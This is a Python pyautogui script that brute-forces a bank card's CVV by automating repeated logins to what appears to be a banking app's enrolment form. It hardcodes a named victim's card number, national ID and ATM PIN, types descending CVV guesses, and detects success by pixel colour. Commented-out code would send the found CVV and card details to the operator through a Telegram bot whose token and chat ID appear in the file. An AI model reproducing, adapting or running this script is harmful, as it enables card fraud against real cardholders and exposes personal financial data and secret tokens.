import pyautogui as robot
import time 
#import telegram

afiliacion = 284,1012
#tipodedocumento = 1427,572
#click_dni = 1406,417
Ndocumento = 458,495
Ntarjeta = 458,550 
Nclavecajero = 458,823
CVV = 395,697
Continuar1 = 280,953
reintentar = 284,957
#reintentar = 1637,984
escape = 533,89

# Este es miooo de Hasen
# no compartir por error, si eres alguien tmre me descuide 

#bot_token2 = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
#chat_id2 = '1850445278'
#bot2 = telegram.Bot(token=bot_token2)

#bot.send_message(chat_id=chat_id, text = 'Corriendo bot :D')

#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

#Pedir dato
print("\n")
print("El programa trabaja de manera descendente 999...998...997...")
print(" Para el fumon de crack movi ")
print("\n")
print("*****************")
print("Escriba los datos: ")


victima_tar = "4919148281632827"
victima_dni = "47566056"
victima_pasw = "1991"
#

print("*****************")

inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))

print("*****************")
print("Presione 'Enter' para continuar")
input()

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	#pyautogui.moveTo(503,315)
	robot.click(clicks=click)

def logeo():
	robot.click(afiliacion) # Ingresas por primera vez? Afilitate!
	time.sleep(3)
	robot.click(45,571) # Clicktarjeta con datos impresos
	time.sleep(0.5)
	robot.click(275,857) # Click Continuar
	time.sleep(1) 

	abrir(Ndocumento)
	time.sleep(0.1)
	robot.typewrite(victima_dni)
	time.sleep(0.1)
	abrir(Ntarjeta)
	time.sleep(0.1)
	robot.typewrite(victima_tar)
	time.sleep(0.2)
	abrir(Nclavecajero)
	time.sleep(0.1)
	robot.typewrite(victima_pasw)
	time.sleep(0.2)
	#robot.click(500,941)
	#time.sleep(0.1)
	robot.click(517,701)
	time.sleep(0.2)


print(":D")


logeo()

contador = 0 # para reiniciar 
inicio = inicio + 1

#Veces que intenta:
intentos = 4

while inicio>fin :  # >  < # desde 999 para abajo
	
	inicio = inicio - 1
	contador += 1
	#print(contador)
	if contador > intentos : # Reiniciar  #4 es lo normal
		print("Reiniciando, esperar por favor")
		time.sleep(0.5)
		abrir(escape)
		time.sleep(0.7)
		robot.click(273,925) # Salir luego de escape
		time.sleep(2.3)

		logeo() # Logeandose de nuevo

		print("Continuando...")
		contador=1

	#print("Intentado con: ",inicio)

	registro = open("registro.txt","a")
	registro.write(str(inicio)) # escribir en el block
	registro.write("\n")
	registro.close()
	 # Borar quizas
	print("Intentando con: ",inicio)

	time.sleep(0.1)
	#print("Borrando") ##################
	abrir(CVV)
	robot.press('backspace')
	robot.press('backspace')
	robot.press('backspace')
	time.sleep(0.1)
	#por si son bajos de 100
	if inicio < 100:
		robot.typewrite("0")
		robot.typewrite(str(inicio))
		time.sleep(0.1)
		#print("Tipeando") #######################
	else:
		robot.typewrite(str(inicio))
		time.sleep(0.1)
		#print("Tipeando") #########################
	#time.sleep(0.1)

	time.sleep(0.2)
	abrir(Continuar1)

	# Para ver cuanto demora en cargar
	blanco =  False
	ceveve = False
	blanco4intento = False

	contadorEmergencia = 0
	while blanco is False :
		contadorEmergencia += 1
		blanco = robot.pixelMatchesColor(517,745,(255,255,255))
		ceveve = robot.pixelMatchesColor(532,800,(212,237,252))
		blanco4intento = robot.pixelMatchesColor(474,181,(255,255,255))
		#print(blanco)
		#print("Cargando..."+ blanco)
		time.sleep(0.1)
		#print(contador)

		if (blanco is True) and (contador < 4):
			print("!!")
			contadorEmergencia = 0
			time.sleep(0.1)
			abrir(reintentar)


		if (ceveve is True):
			print ('\a')
			#bot2.send_message(chat_id=chat_id2, text = "-------------")
			#bot2.send_message(chat_id=chat_id2, text = 'CVV encontrada: '+str(inicio))
			#bot2.send_message(chat_id=chat_id2, text = str(victima_tar))
			#bot2.send_message(chat_id=chat_id2, text = str(victima_dni))
			#bot2.send_message(chat_id=chat_id2, text = str(victima_pasw))

			print("CVV encontrado: "+ str(inicio))
			input ("Presione ' Enter ' para salir")
			quit()
			input()

		if contadorEmergencia == 80:
			print("Detenido por EMERGENCIA (error)")
			print("Enter para continuar o cierralo mejor")
			print("Reinicio final")
			contadorEmergencia = 0
			time.sleep(0.2)
			#robot.click(escape)
			intentos = 1
			contador = 4
			inicio = inicio + 1
			break
			

		if (contador == 4):
			time.sleep(0.5)
			contadorEmergencia = 0
			#time.sleep(0.2)
			#robot.click(escape)
			break
	time.sleep(0.1)



print("Presione 'Enter' para continuar")
input()



